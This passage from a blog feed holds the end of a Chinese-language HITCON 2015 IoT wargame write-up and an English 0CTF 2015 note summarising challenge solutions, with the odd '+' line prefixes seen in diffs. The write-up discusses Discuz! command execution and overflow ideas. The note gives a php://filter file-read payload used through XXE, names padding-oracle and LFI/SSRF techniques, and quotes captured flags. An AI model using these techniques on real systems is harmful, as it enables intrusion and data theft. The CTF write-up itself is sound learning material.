+查了一些關鍵字，會是&lt;code&gt;avr-objdump&lt;/code&gt;嗎?  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;補上直接 dump 的 write-up &lt;a href="http://kb.hitcon.org/post/128246307977/%E7%A7%92%E8%A7%A3-hitcon-nano-%E9%A1%8C"&gt;HITCON Knowledge Base — 秒解 Hitcon Nano 題&lt;/a&gt;  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h2&gt;Raspberry Pi 部份&lt;/h2&gt;
+&lt;p&gt;有分四題：R0, R1, R2, R4 的題目都不同，都是由 Orange 出題。&lt;br&gt;
+我只有碰 R0 跟 R1 的題目，有些想法，但都沒解出來，以下簡單紀錄。  &lt;/p&gt;
+&lt;h3&gt;R0&lt;/h3&gt;
+&lt;p&gt;Web 那邊會拿到一個 &lt;a href="/files/hitcon-2015-iot-wargame/rpi/r0/forkyou"&gt;ARM64 的 binary 執行檔&lt;/a&gt;，&lt;br&gt;
+之後用 &lt;code&gt;qemu-aarch64&lt;/code&gt; 的環境就可以執行，&lt;br&gt;
+聽說還蠻簡單的，可是我還是解不出來QQ&lt;br&gt;
+似乎有在某處看到 &lt;code&gt;/bin/sh -c&lt;/code&gt; 之類的呼叫，&lt;br&gt;
+應該是利用 BOF 把 EIP 指到那邊就可以拿到 shell 了?  &lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;補上 R0 write-up &lt;a href="http://kb.hitcon.org/post/127947378507/hitcon-2015-iot-wargame-r0-%E6%8C%91%E6%88%B0%E9%A1%8C"&gt;HITCON Knowledge Base — HITCON 2015 IoT Wargame – R0 挑戰題&lt;/a&gt;  &lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3&gt;R1&lt;/h3&gt;
+&lt;p&gt;連進去是 Discuz! X3.2&lt;br&gt;
+查了一下，有 remote shell execute 漏洞:&lt;br&gt;
+&lt;a href="http://drops.wooyun.org/papers/4611"&gt;DiscuzX系列命令执行分析公开（三连弹） | WooYun知识库&lt;/a&gt;&lt;br&gt;
+照著做之後，&lt;br&gt;
+找不到在 &lt;code&gt;data/attachment&lt;/code&gt; 底下符合權限的圖片來編輯，&lt;br&gt;
+(最近重灌，還沒裝 DirBuster 或是 Burp Suite，所以沒暴力掃底下有哪些東西...)&lt;br&gt;
+無法觸發 picwidth 的 Remote Shell Excution 漏洞，&lt;br&gt;
+感覺方向應該是對的吧？&lt;br&gt;
+這題是四題裏面沒被人解出來的。&lt;br&gt;
+(GeoHot 把其他三題都解掉了...)  &lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;這次的 Wargame 大概就是這樣吧，&lt;br&gt;
+果然實力還是不夠，&lt;br&gt;
+HST 的 Wargame 拿到 reversed.txt 裡頭一串 ...---.. 後也沒啥想法。  &lt;/p&gt;
+&lt;p&gt;會把 Nano 的部份寫的這麼詳細的原因，&lt;br&gt;
+是因為想要推廣大家玩一下 Wargame 吧！&lt;br&gt;
+(覺得有趣的話就可以來打 CTF 了)&lt;br&gt;
+畢竟上面也講了，這次 Wargame 真的不算難，&lt;br&gt;
+而將近 1000 人的會眾，只有不到 300 人註冊，只有 161 人有拿到分，&lt;br&gt;
+這比例實在有點少。&lt;br&gt;
+再加上幾天前在 Facebook 上看到有人說 Nano 一片一片燒，燒到手快斷了，&lt;br&gt;
+覺得這麼少人玩實在有點可惜。  &lt;/p&gt;
+&lt;p&gt;處理好 Arduino Nano 跟電腦連接之後，&lt;br&gt;
+基本上就是寫 Python Code，&lt;br&gt;
+所以我才戲稱是 Python Wargame，&lt;br&gt;
+但其實沒學過 Python 的人藉著這個機會學一下 Python 也不錯，&lt;br&gt;
+畢竟因為 Python 的方便性，很多 exploit 都用 Python 寫了。  &lt;/p&gt;
+&lt;p&gt;總之，這篇就是一個小廢物的流水帳。&lt;br&gt;
+有問題歡迎留言討論，但我不一定會就是T_T。  &lt;/p&gt;</content><category term="CTF"></category><category term="HITCON"></category><category term="Arduino"></category><category term="Python"></category><category term="Raspberry Pi"></category><category term="Write-up"></category><category term="Conf"></category></entry><entry><title>0CTF 2015 Note</title><link href="https://blog.m157q.tw/posts/2015/03/30/0ctf-2015-note/" rel="alternate"></link><published>2015-03-30T18:15:23+08:00</published><updated>2015-03-30T18:15:23+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-03-30:/posts/2015/03/30/0ctf-2015-note/</id><summary type="html">&lt;p&gt;A note for 0CTF 2015&lt;/p&gt;</summary><content type="html">&lt;h1&gt;web / mislead&lt;/h1&gt;
+&lt;p&gt;Padding Oralcle Attack in Cookie  &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Padding_oracle_attack"&gt;https://en.wikipedia.org/wiki/Padding_oracle_attack&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="https://github.com/mwielgoszewski/python-paddingoracle"&gt;https://github.com/mwielgoszewski/python-paddingoracle&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;web / golden mac 1&lt;/h1&gt;
+&lt;p&gt;Download .DS_Store file from http://202.112.26.102/g0ldenM4c/.DS_Store.&lt;br&gt;
+It tells the flag is in http://202.112.26.102/g0ldenM4c/u_can_not_guess_this_haha.&lt;br&gt;
+Then, upload a .docx files which contains XXE to read the flag.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c"&gt;php://filter/convert.base64-encode/resource=u_can_not_guess_this_haha.php  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing"&gt;https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="http://resources.infosecinstitute.com/xxe-attacks/"&gt;http://resources.infosecinstitute.com/xxe-attacks/&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;web /forward&lt;/h1&gt;
+&lt;p&gt;forward the MySQL connection to your MySQL Server and look at the network traffic.&lt;br&gt;
+u will see the flag leaked.  &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;mysql_native_password  &lt;/span&gt;
+&lt;span class="err"&gt;forward  &lt;/span&gt;
+&lt;span class="err"&gt;SELECT flag FROM forward.flag  &lt;/span&gt;
+&lt;span class="err"&gt;def.forward.flag.flag.flag.flag....  &lt;/span&gt;
+&lt;span class="err"&gt;0ctf{w3ll_d0ne_guY}  &lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr&gt;
+&lt;h1&gt;crypto / GREBeginner&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://gist.github.com/5lipper/d6363e436f08f12f0bbb"&gt;https://gist.github.com/5lipper/d6363e436f08f12f0bbb&lt;/a&gt;  &lt;ul&gt;
+&lt;li&gt;&lt;a href="/files/0ctf-2015-note/GREBeginner.cpp"&gt;GREBeginner&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;crypto / RSA Quine&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://gist.github.com/mheistermann/0dee124d7eed2ec26fcd"&gt;https://gist.github.com/mheistermann/0dee124d7eed2ec26fcd&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1&gt;mobile / dataraidar&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.forensicswiki.org/wiki/How_To_Decrypt_Android_Full_Disk_Encryption"&gt;http://www.forensicswiki.org/wiki/How_To_Decrypt_Android_Full_Disk_Encryption&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="http://blog.scrt.ch/2015/03/27/insomnihack-finals-insomnidroid-level-1-writeup/"&gt;http://blog.scrt.ch/2015/03/27/insomnihack-finals-insomnidroid-level-1-writeup/&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;mobile / simpleapk&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="http://androidcracking.blogspot.tw/2010/12/getting-apk-signature-outside-of.html"&gt;http://androidcracking.blogspot.tw/2010/12/getting-apk-signature-outside-of.html&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;KT_SaH&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;wytshadow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;simpleapk&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;reversed&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;lib&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;saw&lt;/span&gt; &lt;span class="n"&gt;some&lt;/span&gt; &lt;span class="n"&gt;xoring&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;so&lt;/span&gt; &lt;span class="n"&gt;I&lt;/span&gt; &lt;span class="n"&gt;xored&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;txt&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;win&lt;/span&gt;  
+&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;riatre&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;wytshadow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;simpleapk&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;reverse&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;  
+&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;niklasb&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;yeah&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;maybe&lt;/span&gt; &lt;span class="n"&gt;realize&lt;/span&gt; &lt;span class="n"&gt;that&lt;/span&gt; &lt;span class="n"&gt;they&lt;/span&gt; &lt;span class="n"&gt;used&lt;/span&gt; &lt;span class="n"&gt;adi&lt;/span&gt;  
+&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;niklasb&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;adbi&lt;/span&gt;  
+&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;Zzzzzzzzzz&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;wytshadow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;simpleapk&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;inject&lt;/span&gt; &lt;span class="n"&gt;logger&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="n"&gt;smali&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;recompile&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dump&lt;/span&gt; &lt;span class="n"&gt;variable&lt;/span&gt; &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt; &lt;span class="o"&gt;;]&lt;/span&gt;  
+&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;44&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;niklasb&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;XOR&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="n"&gt;had&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="n"&gt;bytes&lt;/span&gt; &lt;span class="n"&gt;at&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;first&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;last&lt;/span&gt; &lt;span class="n"&gt;position&lt;/span&gt;  
+&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;KT_SaH&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;ctf&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="n"&gt;Too_Simple_Sometimes_Naive&lt;/span&gt;&lt;span class="o"&gt;!!!}&lt;/span&gt; &lt;span class="o"&gt;-&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;ctf&lt;/span&gt;&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="n"&gt;It&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="n"&gt;s_More_Than_Meets_The_Eye&lt;/span&gt;&lt;span class="o"&gt;!}&lt;/span&gt;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;mobile / VEZEL&lt;/h1&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;niklasb&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;wytshadow&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;tl&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="n"&gt;dr&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;vezel&lt;/span&gt; &lt;span class="n"&gt;you&lt;/span&gt; &lt;span class="n"&gt;could&lt;/span&gt; &lt;span class="n"&gt;just&lt;/span&gt; &lt;span class="n"&gt;compute&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;values&lt;/span&gt; &lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;another&lt;/span&gt; &lt;span class="n"&gt;app&lt;/span&gt;  
+&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;KT_SaH&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;vezel&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;IDA&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;adb&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;print&lt;/span&gt; &lt;span class="n"&gt;flag&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;  
+&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;39&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;KT_SaH&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;bluestacks&lt;/span&gt;  
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;hr&gt;
+&lt;h1&gt;Pwn Challenges&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href="https://rzhou.org/~ricky/0ctf2015/"&gt;https://rzhou.org/~ricky/0ctf2015/&lt;/a&gt;  &lt;ul&gt;
+&lt;li&gt;&lt;a href="/files/0ctf-2015-note/0ops_app.py"&gt;0ops App&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="/files/0ctf-2015-note/flaggenerator.py"&gt;Flag Generator&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="/files/0ctf-2015-note/freenote.py"&gt;freenote&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="/files/0ctf-2015-note/login.py"&gt;login&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/49c7d68ee13f29ddb435"&gt;https://gist.github.com/seanwupi/49c7d68ee13f29ddb435&lt;/a&gt;  &lt;ul&gt;
+&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/37ffc34032c0ada9a9d8"&gt;flagen&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/929df6655f2acdbab3ff"&gt;freenode&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/e4b1f039e9f949a7b972"&gt;login&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/713023672c42aa62ca9e"&gt;0opsapp&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="https://gist.github.com/seanwupi/286c823afe64617c652d"&gt;vbs&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;VBS  &lt;ul&gt;
+&lt;li&gt;&lt;a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6332"&gt;CVE-2014-6332&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h1&gt;Misc&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;LFI - Local File Inclusion  &lt;ul&gt;
+&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability"&gt;https://en.wikipedia.org/wiki/File_inclusion_vulnerability&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion"&gt;https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="http://hakipedia.com/index.php/Local_File_Inclusion"&gt;http://hakipedia.com/index.php/Local_File_Inclusion&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;SSRF - Server Side Request Forgery  &lt;ul&gt;
+&lt;li&gt;&lt;a href="https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/"&gt;https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities"&gt;http://www.slideshare.net/d0znpp/ssrf-attacks-and-sockets-smorgasbord-of-vulnerabilities&lt;/a&gt;  &lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</content><category term="CTF"></category><category term="Write-up"></category><category term="0CTF"></category></entry></feed>
